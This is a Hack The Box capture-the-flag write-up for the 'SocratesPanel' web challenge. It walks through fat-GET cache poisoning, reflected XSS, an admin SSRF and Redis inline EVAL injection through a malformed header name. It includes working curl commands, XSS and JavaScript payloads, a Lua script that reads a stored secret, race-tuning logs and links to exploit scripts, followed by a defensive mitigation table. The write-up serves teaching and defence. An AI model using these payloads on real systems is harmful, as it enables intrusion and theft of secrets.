---
title: "Hack The Box Challenge — SocratesPanel"
summary: "SocratesPanel chains fat-GET cache poisoning, reflected XSS, an admin-only SSRF and Redis inline-command injection to recover a cached secret."
platform: "Hack The Box"
contentType: "challenge"
publicationPolicy: "retired"
challengeCategory: "Web"
difficulty: "Hard"
solvedAt: 2026-09-15
publishedAt: 2026-09-15
tags:
  - web-cache-poisoning
  - fat-get
  - reflected-xss
  - race-condition
  - ssrf
  - redis
  - protocol-confusion
  - tornado
tools:
  - curl
  - Python
  - Requests
  - jq
cves: []
htbUrl: "https://app.hackthebox.com/challenges/SocratesPanel"
cover: "/images/writeups/hackthebox/challenges/shared/hackthebox-challenge-cover.webp"
coverAlt: "Abstract cybersecurity challenge medallion with terminal, puzzle and network motifs"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents work performed against the isolated Hack The Box SocratesPanel challenge instance. Publication proceeded at the portfolio owner's explicit direction without an independent status lookup during this update. The real flag, temporary target address, generated credentials and run-specific identifiers have been removed. The original challenge package is not redistributed.

More Hack The Box material is available in the [write-ups archive](/writeups/) and the focused [Challenges archive](/writeups/challenges/).

## Executive summary

SocratesPanel is a Tornado application placed behind a small Go caching service, with Redis serving both as the cache and as the final secret store. The intended path is not one isolated bug. It is a multi-stage chain across components with different interpretations of the same request.

The CDN keys cached GET responses only from `req.URL.String()`, but forwards the original GET body to Tornado. A fat GET can therefore request the admin bot's URL while placing a different `query` in the body. Tornado renders that body value without escaping, allowing an attacker-controlled XSS response to be stored under the bot's clean cache key.

The cache fill is a race. I used the authenticated quote-submission endpoint to add large sets of unverified quotes whose words covered the bot's random vocabulary. This made the bot's normal search response expensive while the poisoned request selected `verified_only=on` and stayed small. Once the admin refreshed the poisoned page, JavaScript submitted an authenticated request to `/panel`, an admin-only URL fetcher that converts arbitrary form-argument names into outbound HTTP header names.

Classic CRLF injection failed because Tornado rejects CR and LF while serializing headers. The working primitive instead placed a Redis inline `EVAL` command inside a deliberately malformed header name. Redis executed the command before later HTTP header lines terminated the connection. The Lua code read the challenge secret and wrote a correctly shaped CDN response object under the SHA-256 cache key of a fresh path. Fetching that path returned the redacted flag, and Hack The Box accepted it.

## Challenge information

| Item | Value |
| --- | --- |
| Name | `SocratesPanel` |
| Platform | Hack The Box |
| Category | Web |
| Difficulty | Hard |
| Solved | 15 September 2026 |
| Publication | Owner-authorized; status not independently rechecked during publication |
| Core chain | Fat-GET cache poisoning → reflected XSS → admin bot → authenticated SSRF → Redis inline command injection → forged CDN cache entry |

## Provided material and evidence boundaries

The challenge supplied an ephemeral HTTP endpoint and a password-protected source archive. After extraction, the important layout was:

```text
SocratesPanel/
├── Dockerfile
├── build-docker.sh
├── cdn-service/
│   ├── go.mod
│   └── main.go
├── redis/
│   ├── redis.conf
│   └── redis_init.sh
├── supervisord.conf
└── web-app/
    ├── app.py
    ├── config.py
    ├── db/
    ├── handlers/
    │   ├── api/
    │   └── routes/
    ├── templates/
    └── utils/
```

The source archive, bundled application, original `flag.txt` and challenge configuration are not included in this repository. Only short source excerpts needed to explain the attack are reproduced. Two scripts written during the solve are published as safe derived artifacts:

- [Download the search-delay helper](/files/writeups/hackthebox/challenges/web/socrates-panel/socrates_add_delay.py)
- [Download the verified exploit](/files/writeups/hackthebox/challenges/web/socrates-panel/socrates_exploit.py)

Both scripts require an explicitly supplied `TARGET`; neither contains the temporary challenge address, credentials or recovered flag.

## Initial architecture review

The Docker and Supervisor files established the internal topology:

| Component | Internal endpoint | Role |
| --- | --- | --- |
| Go CDN | `:1337` | Public HTTP entry point and Redis-backed response cache |
| Tornado application | `127.0.0.1:8888` | Authentication, quotes, search, reporting and admin panel |
| Redis | `127.0.0.1:6379` | CDN cache and final secret storage |
| Selenium/Chrome | Local process | Logs in as admin and reviews reported searches |

Redis was intentionally loopback-only and protected mode was enabled:

```ini
bind 127.0.0.1
port 6379
protected-mode yes
```

The initialization script moved the objective into Redis and deleted the original file:

```bash
redis-cli SET FLAG $(cat /flag.txt)
rm /flag.txt
```

This immediately changed the goal from filesystem access to reaching Redis or influencing the CDN's Redis data.

## Identifying the weaknesses

### The CDN ignores the GET body when computing its cache key

The CDN decides that every GET except `/panel` is cacheable. Its key is the SHA-256 digest of the URL string:

```go
func hash(url string) string {
    h := sha256.New()
    h.Write([]byte(url))
    return hex.EncodeToString(h.Sum(nil))
}

key := hash(req.URL.String())
```

On a miss, however, `forwardRequest()` preserves the original method, body and headers:

```go
req, err := http.NewRequest(origReq.Method, originURL.String(), origReq.Body)

for key, values := range origReq.Header {
    for _, value := range values {
        req.Header.Add(key, value)
    }
}
```

Consequently, these two requests share one cache key even though Tornado can produce different responses:

```http
GET /search?query=SAFE HTTP/1.1

GET /search?query=SAFE HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query=ATTACKER_VALUE
```

This is the fat-GET cache-poisoning primitive.

### Tornado renders the effective query without escaping

`SearchHandler` retrieves the merged `query` argument, records it, splits it into SQL search terms and passes it to the template:

```python
query = self.get_argument("query", default=None)
await insert_search(query)

words = query.split()
placeholders = " OR ".join(["LOWER(quote) LIKE ?"] * len(words))
values = tuple(f"%{word.lower()}%" for word in words)

self.render(
    "search.html",
    search=query,
    verified_only=verified_only,
    results=results,
)
```

The application globally disables Tornado's autoescaping:

```python
tornado.web.Application(
    routes,
    cookie_secret=urandom(20),
    autoescape=None,
    template_path="templates",
)
```

The template then places `search` in both an attribute and an HTML heading without calling `escape()`:

```html
<input type="text" name="query"
       {% if search %}value="{{ search }}"{% end %}>

<h2>Results for "{{ search }}"</h2>
```

By comparison, quote results are explicitly rendered with `{{ escape(result) }}`. The inconsistent handling makes `query` a reflected-XSS sink.

### The report endpoint reveals and revisits a random cache key

Reporting does not ask the bot to visit an attacker-supplied URL. Instead, it generates a four-word query from the verified quote vocabulary:

```python
url = (
    "http://127.0.0.1:1337/search?query="
    + quote(rand_search(4))
)
threading.Thread(target=run_bot, args=(url,)).start()
```

The bot logs in as `admin`, loads that URL and refreshes it:

```python
self.driver.get("http://127.0.0.1:1337/login")
self.driver.find_element("name", "username").send_keys("admin")
self.driver.find_element("name", "password").send_keys(ADMIN_PASS)
self.driver.find_element("name", "submit").click()
self.driver.get(url)
self.driver.refresh()
sleep(1)
```

The first load creates the race for the cache entry. If the attacker wins, the refresh consumes the poisoned response in the authenticated admin browser.

The random query is observable through `/api/prev_searches`, which retains recent searches for two minutes. This gives the attacker the exact URL that must be raced.

### The admin panel is an authenticated SSRF gadget

`/panel` is available only to the signed-in admin. It accepts a URL with only a `startswith("http")` check, then treats every other request-argument name as an outbound header name:

```python
url = self.get_argument("url", default=None)
if not url.startswith("http"):
    self.set_status(400)
    return

headers = {}
for key in self.request.arguments:
    if key != "url":
        headers[key] = self.get_argument(key)

response = await AsyncHTTPClient().fetch(
    url,
    headers=headers,
    request_timeout=3,
)
```

This provides two capabilities once XSS runs in the admin origin:

1. Reach a loopback-only service such as `http://127.0.0.1:6379/`.
2. Control both the names and values of headers sent to that service.

## Confirming the primitives

### Observing stored searches and launching the bot

A known marker verified that the recent-search endpoint was live:

```bash
curl -si "$TARGET/api/prev_searches?cb=$(date +%s)"
```

```http
HTTP/1.1 200 OK
X-Cache: miss

{"searches": ["ILIAS_TEST_1988"]}
```

The report endpoint returned immediately while the Selenium process continued asynchronously:

```bash
curl -s -X POST "$TARGET/api/report"
```

```json
{"status":"success","message":"Thanks for your report! We will review it shortly."}
```

Polling `/api/prev_searches` then exposed new four-word searches generated for the admin bot.

### Proving reflected XSS

The first harmless payload only changed the page title:

```html
<img src=x onerror=document.title='XSS_OK'>
```

Opening the corresponding search showed `XSS_OK` in the browser tab. This confirmed script execution without attempting to read privileged data.

### Proving fat-GET cache poisoning

I used a unique clean URL query while supplying the XSS as a form-encoded GET body:

```bash
SAFE="FATGET_$(date +%s)"
POISON="<img src=x onerror=document.title='FATGET_OK'>"

curl -sS \
  -D /tmp/fatget-h1 \
  -o /tmp/fatget-b1 \
  -X GET "$TARGET/search?query=$SAFE" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "query=$POISON"
```

The first response was a cache miss, but its rendered body contained the body-supplied payload:

```text
HTTP/1.1 200 OK
X-Cache: miss
81:value="<img src=x onerror=document.title='FATGET_OK'>"
99:<h2>Results for "<img src=x onerror=document.title='FATGET_OK'>"</h2>
```

A normal bodyless GET to exactly the same URL returned the poisoned representation:

```bash
curl -sS \
  -D /tmp/fatget-h2 \
  -o /tmp/fatget-b2 \
  "$TARGET/search?query=$SAFE"
```

```text
HTTP/1.1 200 OK
X-Cache: hit
81:value="<img src=x onerror=document.title='FATGET_OK'>"
99:<h2>Results for "<img src=x onerror=document.title='FATGET_OK'>"</h2>
```

That was the decisive cross-layer mismatch: the clean URL selected the cache object while Tornado's body argument selected its contents.

## Engineering the cache race

### Why the first race lost

The first watcher detected the admin query and launched poisoned requests, but every response was already a hit:

```text
[+] Worker detected bot query: intelligent physical disrespect intelligent,
[+] Poison responses: ['hit', 'hit', 'hit', ...]
[+] Cache misses: 0
[-] Marker not found. The cache race was not won this attempt.
```

By the time `/api/prev_searches` exposed the query, the bot's normal search had often completed and populated Redis. More concurrency could not repair a cache entry that already existed.

### Creating a controlled origin delay

Authenticated users can submit unverified quotes through `/api/quotes`. The bot's four words come from the 63 verified quotes loaded at startup. I extracted 540 usable vocabulary words, split them into quote-sized groups, and submitted repeated unverified rows that covered that vocabulary.

This created an asymmetric race:

- The bot's ordinary four-word search matched and rendered thousands of unverified rows.
- The poison request added `verified_only=on`, so Tornado searched only the original verified subset.
- The XSS payload contained no literal whitespace, so it remained one search term.

The final recorded delay-helper run used eight workers and added 3,000 rows successfully:

```bash
export ROWS_PER_GROUP=1500
export FILL_WORKERS=8
python3 socrates_add_delay.py
```

```text
[+] Original quotes: 63
[+] Usable generator words: 540
[+] Coverage groups: 2
[+] Adding 3000 total rows using 8 workers
[+] Completed 3000/3000; added=3000; failed=0
[+] Finished: added=3000, failed=0
[+] Probe "'I": 2813310 bytes
[+] Probe 'knowledge,': 2822421 bytes
```

The helper had also been run in earlier tuning batches. The important evidence is not an assumed final row count but the measured multi-megabyte search responses. The original Challenge archive and database were not copied into the public repository.

### Correctly interpreting concurrent cache misses

The CDN uses `SETNX` after fetching from the origin:

```go
err = rdb.SetNX(ctx, key, res, 60*time.Second).Err()
```

Several parallel requests can therefore report `X-Cache: miss`: each observed an empty key before starting its origin request. Only the first completed response wins `SETNX`. A miss alone does not prove that the poison was stored.

The final exploit follows the race with a normal cache probe and searches the stored response for its unique marker:

```text
[+] Stored cache: X-Cache=hit contains-payload=True
```

That single check eliminated a major source of misleading diagnostics.

## Turning the panel SSRF into Redis command execution

### Why the CRLF approach could never work

An early payload placed a complete RESP `EVAL` request after injected CRLF bytes in a header value. It was plausible at the application layer but incompatible with the actual Tornado client.

Tornado 6.4.2 serializes each header as `name + ": " + value`, then explicitly rejects CR or LF before writing the request:

```python
header_lines = (
    native_str(n) + ": " + native_str(v)
    for n, v in headers.get_all()
)
lines.extend(line.encode("latin1") for line in header_lines)
for line in lines:
    if CR_OR_LF_RE.search(line):
        raise ValueError("Illegal characters (CR or LF) in header")
```

This explained a very specific result from the earlier exploit:

```text
[+] Stored cache: X-Cache=hit contains-payload=True
[+] Admin JavaScript marker observed: True
[-] Poison won, but output endpoint stayed at status 404
[-] XSS executed; remaining failure is panel/Redis injection
```

The cache race and JavaScript execution had succeeded. Retrying could never fix a deterministic serializer rejection in the final stage.

### Injecting a Redis inline command through the header name

The same Tornado version normalizes header names but does not enforce the HTTP field-name character grammar in `HTTPHeaders.__setitem__()`:

```python
def __setitem__(self, name, value):
    norm_name = _normalize_header(name)
    self._dict[norm_name] = value
    self._as_list[norm_name] = [value]
```

Redis supports an inline command format consisting of space-separated arguments. Quotes allow the Lua program to remain one argument. Instead of inserting new lines, the working exploit controls one malformed header's name and value:

```text
Header name:  EVAL "<lowercase-safe Lua program>;--x
Header value: " 0
```

Tornado's normal `name: value` serialization turns them into a line equivalent to:

```text
Eval "<lowercase-safe Lua program>;--X: " 0
```

Redis parses that line as:

```text
Command: EVAL
Script:  <lowercase-safe Lua program>;--X:
Numkeys: 0
```

The colon and space automatically inserted by the HTTP serializer land after the Lua `--` comment marker. The header value closes the quoted script argument and supplies the required `0` argument.

Tornado's `_normalize_header()` applies `capitalize()` to hyphen-separated name segments. Because our entire program lives in the malformed header name, the Lua source was deliberately written so this case conversion could not break it. The uppercase key name `FLAG` is reconstructed at runtime as `string.char(70,76,65,71)`.

### Forging the CDN response object

The Go service expects Redis values to decode into this structure:

```go
type Response struct {
    Body       string      `json:"body"`
    StatusCode int         `json:"status_code"`
    Headers    http.Header `json:"headers"`
}
```

For a fresh output path such as `/flagout-<RUN_ID>`, the exploit calculates the same key as the CDN:

```python
output_path = f"/flagout-{run_id}"
redis_key = hashlib.sha256(output_path.encode()).hexdigest()
```

The lowercase-safe Lua program reads the secret and stores a valid response under that key:

```python
lua = (
    "local f=redis.call('get',string.char(70,76,65,71));"
    "local v=cjson.encode({body=f,status_code=200,"
    "headers={['content-type']={'text/plain'}}});"
    f"redis.call('set','{redis_key}',v,'ex',120);return 1;--x"
)
```

The malformed header name and value are Base64-encoded inside the JavaScript. This avoids literal spaces in the XSS search term while reconstructing the exact strings in the browser:

```javascript
h=atob('<HEADER_NAME_B64>');
v=atob('<HEADER_VALUE_B64>');
d=new(URLSearchParams)();
d.set('url','http://127.0.0.1:6379/');
d.set(h,v);
fetch('/panel',{
  method:'POST',
  keepalive:true,
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:d
});
```

The script also requests `/search?query=<UNIQUE_MARKER>`. Seeing that value in `/api/prev_searches` independently proves that the admin executed the cached JavaScript.

## Verified exploit workflow

The published exploit automates the complete online phase:

1. Record the current recent-search baseline.
2. Warm dedicated watcher and poisoner HTTP connections.
3. Start several watchers, then submit `/api/report`.
4. Detect the new four-word bot query.
5. Send fat GETs whose URL uses the bot query but whose body uses the whitespace-free XSS plus `verified_only=on`.
6. Probe the final stored representation instead of trusting `X-Cache: miss`.
7. Wait for the admin marker.
8. Poll the fresh output path until the forged CDN response appears.

It was launched only after allowing old cache entries and Selenium jobs to expire:

```bash
sleep 130

export TARGET='http://<TARGET>'
export MAX_ATTEMPTS=20
export ATTEMPT_COOLDOWN=15
unset WATCHERS POISONERS

python3 -u socrates_exploit.py | tee final-run.log
```

The exploit's target is supplied at runtime and is intentionally absent from the downloadable file.

## Validation

The first final-version attempt lost the cache race. The second attempt won and completed every stage:

```text
[*] Socrates exploit 3.0-inline-header-eval

[+] Attempt 1/20
[+] Stored cache: X-Cache=hit contains-payload=False
[-] Origin response won SetNX; retrying

[+] Attempt 2/20
[+] Payload length: 647; whitespace-free: True
[+] Report: 200
[+] Stored cache: X-Cache=hit contains-payload=True
[+] Poisoned cache CONFIRMED; waiting for admin refresh/Redis
[+] Admin JavaScript marker observed: True

[SUCCESS] FLAG RETRIEVED
<REDACTED_FLAG>
```

The final value matched the expected HTB flag syntax and was accepted by the platform. The value itself, run IDs, Redis cache-key digest and ephemeral target have been removed.

Validation existed at several independent layers:

1. Source review proved the URL-only CDN key and forwarded GET body.
2. A two-request fat-GET test proved that a body-selected representation could be cached under a clean URL.
3. The browser title change proved reflected XSS.
4. `/api/prev_searches` exposed the bot's random four-word query and later the JavaScript marker.
5. `contains-payload=True` proved that the poison, not merely an origin response, won `SETNX`.
6. The final output path returned a correctly structured cached response containing the objective.
7. Hack The Box accepted the recovered value.

## Failed approaches and useful diagnostics

### Assuming the local quotes path existed

The first delay script expected `web-app/db/quotes.json` in the Kali working tree and failed immediately:

```text
FileNotFoundError: [Errno 2] No such file or directory: 'web-app/db/quotes.json'
```

The final helper searches recursively for a local copy and otherwise downloads only the verified quote text from `/quotes`. This made it work from the actual extracted-directory layout without silently inventing a path.

### Racing without enough origin delay

The initial cache race observed the bot's query only after the bot had already populated Redis. All poison requests returned hits, and no marker appeared. This led to the quote-inflation strategy rather than simply increasing thread counts.

### Treating every cache miss as a winning request

After quote inflation, multiple poisoners often returned `miss`. Because origin work happens before `SETNX`, this proved only that they began while the key was absent. The follow-up cache-content probe was necessary to identify the actual winner.

### Building a payload that contained whitespace

An intermediate JavaScript payload embedded data in a way that introduced literal whitespace. `SearchHandler` splits the query on whitespace, creating more SQL predicates and a larger poison response. The final exploit Base64-encodes the malformed header strings and explicitly rejects a payload if `any(ch.isspace() for ch in payload)` is true.

### Repeatedly retrying a blocked CRLF injection

Several runs won the race and showed the admin marker but still returned `404` from the output path. Those retries were useful because they isolated the fault, but once XSS execution was confirmed, the remaining failure was deterministic. Inspecting the exact Tornado 6.4.2 serializer revealed the CR/LF rejection and led to the header-name inline-command primitive.

## Why the full chain works

The attack succeeds because each component makes a locally plausible assumption that is false across the full system:

1. **The CDN assumes the URL fully identifies a GET response.** It does not include the forwarded body in the cache key.
2. **Tornado accepts a GET body as an argument source.** The same cache key can therefore produce attacker-selected content.
3. **The template assumes search text is safe.** Global autoescaping is disabled and the reflected query is not explicitly escaped.
4. **The reporting workflow assumes a random URL is unguessable in time.** The search log discloses it while origin processing is still in flight.
5. **The panel assumes outbound headers are harmless configuration.** Attacker-controlled argument names become protocol bytes sent to an arbitrary internal port.
6. **Tornado checks line breaks but not the complete header-name grammar.** A single malformed header line can itself be a Redis inline command.
7. **Redis and the CDN share a trust domain.** Writing the correctly shaped JSON under a predictable hash lets Redis data become an HTTP response.

No single issue alone returns the objective. The exploit relies on semantic disagreement at every boundary: URL versus body, cache miss versus cache winner, HTTP header versus Redis command, and Redis value versus CDN response object.

## Defensive perspective

| Weakness | Defensive action |
| --- | --- |
| Cache key excludes a forwarded GET body | Reject GET requests with bodies at the edge, or include every representation-affecting input in the cache key |
| Cache fill uses origin-first `SETNX` | Use request coalescing or a cache lock, and ensure only one trusted origin fill can populate a key |
| Search query rendered with `autoescape=None` | Enable automatic HTML escaping and explicitly escape values in both attributes and element content |
| Public recent-search feed leaks bot state | Remove it, scope it per user, or prevent privileged workflow identifiers from entering shared logs |
| Admin bot revisits the same cacheable URL | Use a separate uncached origin, isolate its session and validate reported content without executing active scripts |
| `/panel` accepts arbitrary URLs | Apply a strict destination allow-list, resolve and validate IPs, block loopback/private ranges and revalidate redirects |
| Form keys become header names | Use a fixed allow-list of header fields and validate names against the HTTP token grammar |
| Redis reachable from the web application | Separate networks and privileges, require authentication/ACLs and avoid using the same Redis database for secrets and response cache |
| Predictable CDN cache keys and trusted JSON values | Namespace and authenticate cache objects; do not treat arbitrary Redis values as trusted serialized responses |

The most important lesson is that patching only the XSS or only Redis would leave serious architectural weaknesses. The safe design has to preserve a consistent request model and strong trust boundaries from the CDN through the application to internal services.

## Key takeaways

- A GET body is dangerous when an origin processes it but an intermediary ignores it for cache identity.
- In a concurrent cache fill, `X-Cache: miss` does not prove which response ultimately populated the key.
- Performance can be part of exploitability. Inflating the expensive branch converted a near-impossible race into a repeatable one.
- Admin bots turn reflected XSS into authenticated actions when they revisit shared cache entries.
- SSRF is protocol interaction, not merely HTTP content retrieval; an HTTP client can accidentally speak enough of another line-oriented protocol to execute commands.
- Blocking CRLF prevents classic header-value smuggling but does not replace complete header-name validation.
- Source review across service boundaries was essential: the individual Go, Tornado and Redis behaviors only became exploitable when combined.
- Strong intermediate markers made it possible to distinguish a lost race, failed JavaScript execution and failed Redis injection.

## References

- [Hack The Box — SocratesPanel](https://app.hackthebox.com/challenges/SocratesPanel)
- [Tornado 6.4.2 `HTTPHeaders` implementation](https://github.com/tornadoweb/tornado/blob/v6.4.2/tornado/httputil.py)
- [Tornado 6.4.2 HTTP/1 header serialization](https://github.com/tornadoweb/tornado/blob/v6.4.2/tornado/http1connection.py)
- [Redis serialization protocol specification and inline commands](https://redis.io/docs/latest/develop/reference/protocol-spec/)
- [Redis security documentation](https://redis.io/docs/latest/operate/oss_and_stack/management/security/)
